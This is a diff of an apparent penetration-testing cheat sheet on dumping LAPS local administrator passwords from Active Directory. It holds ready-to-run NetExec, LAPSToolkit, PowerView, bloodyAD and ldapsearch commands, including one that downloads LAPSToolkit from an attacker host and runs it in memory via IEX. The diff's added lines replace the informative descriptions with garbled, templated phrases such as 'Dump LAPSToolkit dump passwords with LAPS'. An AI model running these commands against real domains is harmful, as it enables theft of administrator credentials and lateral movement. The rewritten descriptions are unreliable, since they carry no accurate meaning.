@@ -4,9 +4,9 @@ Local Administrator Password Solution stores per-machine local admin passwords i
 
 ### nxc LAPS module
 
-NetExec's `laps` module reads the LAPS attribute over LDAP and prints recovered passwords for every computer the user can read. Fast first check.
+Read nxc LAPS module with LAPS.
 
-```sh title:"NetExec LAPS reader - dumps all readable LAPS passwords"
+```sh title:"LAPS Read Nxc LAPS Module"
 nxc ldap $domain -u $user $auth_flags -M laps
 ```
 <!-- cheat
@@ -17,18 +17,18 @@ import nxc_auth
 
 ### LAPSToolkit list computers
 
-PowerShell module enumeration of all LAPS-managed computers from a domain-joined host.
+List LAPSToolkit list computers with LAPS.
 
-```powershell title:"List all LAPS-managed computers via LAPSToolkit"
+```powershell title:"LAPS List LAPSToolkit List Computers"
 Import-Module .\LAPSToolkit.ps1; Get-LAPSComputers
 ```
 <!-- cheat -->
 
 ### LAPSToolkit download and import
 
-Download LAPSToolkit from your web server and import it.
+Download LAPSToolkit download and import with LAPS.
 
-```powershell title:"Download and import LAPSToolkit"
+```powershell title:"LAPS Download LAPSToolkit Download and Import"
 (New-Object System.Net.WebClient).DownloadString('http://$lhost/LAPSToolkit.ps1') | IEX; Import-Module .\LAPSToolkit.ps1
 ```
 <!-- cheat
@@ -37,27 +37,27 @@ var lhost
 
 ### LAPSToolkit delegated groups
 
-Find the AD groups delegated rights to read LAPS passwords - tells you which group memberships to target for LAPS recovery.
+Read LAPSToolkit delegated groups with LAPS.
 
-```powershell title:"Find groups delegated LAPS read rights"
+```powershell title:"LAPS Read LAPSToolkit Delegated Groups"
 Import-Module .\LAPSToolkit.ps1; Find-LAPSDelegatedGroups
 ```
 <!-- cheat -->
 
 ### LAPSToolkit extended rights
 
-Find users and groups with extended rights over LAPS password attributes.
+Find LAPSToolkit extended rights with LAPS.
 
-```powershell title:"Find principals with LAPS extended rights"
+```powershell title:"LAPS Find LAPSToolkit Extended Rights"
 Import-Module .\LAPSToolkit.ps1; Find-AdmPwdExtendedRights
 ```
 <!-- cheat -->
 
 ### LAPSToolkit dump passwords
 
-Dump LAPS passwords readable by the current user via LAPSToolkit.
+Dump LAPSToolkit dump passwords with LAPS.
 
-```powershell title:"Dump all LAPS passwords visible to current user"
+```powershell title:"LAPS Dump LAPSToolkit Dump Passwords"
 Get-LAPSPasswords -DomainController $rhost_name -Credential $domain\$user | Format-Table -AutoSize
 ```
 <!-- cheat
@@ -68,9 +68,9 @@ var user
 
 ### PowerView LAPS read
 
-Read `ms-Mcs-AdmPwd` directly via PowerView (legacy LAPS). For Windows LAPS, query `msLAPS-Password` or `msLAPS-EncryptedPassword` instead.
+Read PowerView LAPS read with LAPS.
 
-```powershell title:"Read ms-Mcs-AdmPwd from a computer object via PowerView"
+```powershell title:"LAPS Read PowerView LAPS Read"
 Get-DomainObject $rhost_name -Properties "ms-mcs-AdmPwd",name
 ```
 <!-- cheat
@@ -79,9 +79,9 @@ var rhost_name
 
 ### bloodyAD LAPS read
 
-Read the LAPS password attribute over LDAP from Linux via bloodyAD.
+Read bloodyAD LAPS read with LAPS.
 
-```sh title:"Read ms-Mcs-AdmPwd over LDAP via bloodyAD"
+```sh title:"LAPS Read BloodyAD LAPS Read"
 bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_computer --attr ms-Mcs-AdmPwd
 ```
 <!-- cheat
@@ -94,9 +94,9 @@ var target_computer
 
 ### ldapsearch LAPS
 
-Raw LDAP query for hosts where `ms-Mcs-AdmPwd` is readable. Useful when canned tools aren't available.
+Read ldapsearch LAPS with LAPS.
 
-```sh title:"Raw LDAP search for readable ms-Mcs-AdmPwd values"
+```sh title:"LAPS Read Ldapsearch LAPS"
 ldapsearch -x -H ldap://$rhost_ip -D "$user@$domain" -w $pass -b "$base_dn" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd sAMAccountName
 ```
 <!-- cheat
